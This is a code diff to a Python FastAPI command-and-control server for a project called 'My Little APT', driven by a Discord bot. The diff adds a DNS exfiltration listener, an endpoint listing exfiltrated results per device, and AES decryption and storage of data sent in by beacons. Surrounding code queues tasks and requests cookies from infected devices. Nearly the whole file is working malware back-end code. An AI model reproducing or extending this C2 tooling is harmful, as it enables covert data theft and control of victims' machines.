@@ -1,18 +1,18 @@
 """
 C2 Server — FastAPI application.
 Acts as the intermediary between the Discord bot (admin panel) and the
-future client app (beacon). The bot communicates with the server via
-HTTP endpoints.
+client app (beacon). The bot communicates with the server via HTTP endpoints.
 """
 
 import logging
+from contextlib import asynccontextmanager
 from datetime import datetime, timezone
 
 from fastapi import FastAPI, HTTPException, status
 from pydantic import BaseModel
 
 from command_handler import CommandHandler
-from config import SERVER_HOST, SERVER_PORT, VALID_BEACON_INTERVALS
+from config import DNS_LISTENER_PORT, SERVER_HOST, SERVER_PORT, VALID_BEACON_INTERVALS
 from models import (
     BeaconCheckIn,
     DeviceInfo,
@@ -37,13 +37,30 @@ logger = logging.getLogger("c2-server")
 handler = CommandHandler()
 
 # ---------------------------------------------------------------------------
+# Lifespan: start DNS listener alongside FastAPI
+# ---------------------------------------------------------------------------
+
+
+@asynccontextmanager
+async def lifespan(app: FastAPI):  # type: ignore[type-arg]
+    """Start background services on startup."""
+    try:
+        from dns_server import start_dns_server
+        start_dns_server(handler, port=DNS_LISTENER_PORT)
+    except ImportError:
+        logger.warning("dnslib not installed — DNS exfiltration channel disabled.")
+    yield
+
+
+# ---------------------------------------------------------------------------
 # FastAPI app
 # ---------------------------------------------------------------------------
 
 app = FastAPI(
     title="My Little APT — C2 Server",
     description="Command-and-control backend for the my-little-apt project.",
-    version="0.2.0",
+    version="0.3.0",
+    lifespan=lifespan,
 )
 
 
@@ -124,6 +141,22 @@ async def admin_request_cookies() -> dict:
     }
 
 
+@app.get("/admin/results", tags=["admin"])
+async def admin_results() -> dict:
+    """Return the latest exfiltrated result for each task type per device."""
+    results_by_device: dict[str, dict] = {}
+    for device in handler.devices.values():
+        if device.results:
+            results_by_device[device.name] = device.results
+
+    total = sum(len(r) for r in results_by_device.values())
+    return {
+        "status": "success",
+        "data": {"results_by_device": results_by_device},
+        "message": f"{total} result(s) across {len(results_by_device)} device(s)",
+    }
+
+
 @app.post("/admin/beacon-interval", tags=["admin"])
 async def admin_set_beacon_interval(body: SetBeaconIntervalRequest) -> dict:
     """Update the beacon interval."""
@@ -166,7 +199,7 @@ async def admin_set_protocol(body: SetProtocolRequest) -> dict:
 
 
 # ---------------------------------------------------------------------------
-# Beacon endpoints (for the future app)
+# Beacon endpoints (client → server)
 # ---------------------------------------------------------------------------
 
 @app.post(
@@ -177,8 +210,8 @@ async def admin_set_protocol(body: SetProtocolRequest) -> dict:
 async def beacon_check_in(payload: BeaconCheckIn) -> dict:
     """
     Beacon registers or updates its presence.
-    Returns the current server configuration so the app knows the
-    expected interval and protocol.
+    Returns the current server configuration so the client knows the
+    expected interval and protocol for the next exfiltration.
     """
     device = DeviceInfo(
         name=payload.device_name,
@@ -200,8 +233,7 @@ async def beacon_check_in(payload: BeaconCheckIn) -> dict:
 async def beacon_get_tasks(device_name: str) -> dict:
     """
     Beacon polls for pending tasks.
-    Dequeues and returns any tasks queued for the requesting device.
-    Tasks are removed from the queue once returned (fire-once).
+    Dequeues and returns any tasks queued for the requesting device (fire-once).
     """
     device = handler.get_device(device_name)
     if device is None:
@@ -211,10 +243,7 @@ async def beacon_get_tasks(device_name: str) -> dict:
                    f"Call /beacon/check-in first.",
         )
 
-    # Update last_seen timestamp on poll.
     device.last_seen = datetime.now(timezone.utc)
-
-    # Dequeue all pending tasks for this device.
     tasks = handler.dequeue_tasks(device_name)
 
     return {
@@ -234,6 +263,22 @@ async def beacon_submit_result(result: TaskResult) -> dict:
             detail=f"Device '{result.device_name}' is not registered.",
         )
 
+    data = dict(result.data)
+
+    # Decrypt AES-encrypted payload if flagged.
+    if result.encrypted and "output" in data:
+        try:
+            from crypto import decrypt
+            data["output"] = decrypt(str(data["output"]))
+        except Exception as exc:
+            logger.warning("Failed to decrypt result for task %s: %s", result.task_id, exc)
+
+    handler.store_result(
+        task_id=result.task_id,
+        device_name=result.device_name,
+        data=data,
+        success=result.success,
+    )
     logger.info(
         "Task result from %s (task_id=%s, success=%s)",
         result.device_name,
@@ -254,7 +299,7 @@ async def beacon_get_config() -> dict:
 
 
 # ---------------------------------------------------------------------------
-# Admin task queue endpoint
+# Admin task queue endpoints
 # ---------------------------------------------------------------------------
 
 @app.post("/admin/queue-task", tags=["admin"])
@@ -274,7 +319,6 @@ async def admin_queue_task(body: QueueTaskRequest) -> dict:
             "message": f"Queued '{body.task_type}' for {len(tasks)} device(s)",
         }
 
-    # Validate device exists.
     device = handler.get_device(body.device_name)
     if device is None:
         raise HTTPException(
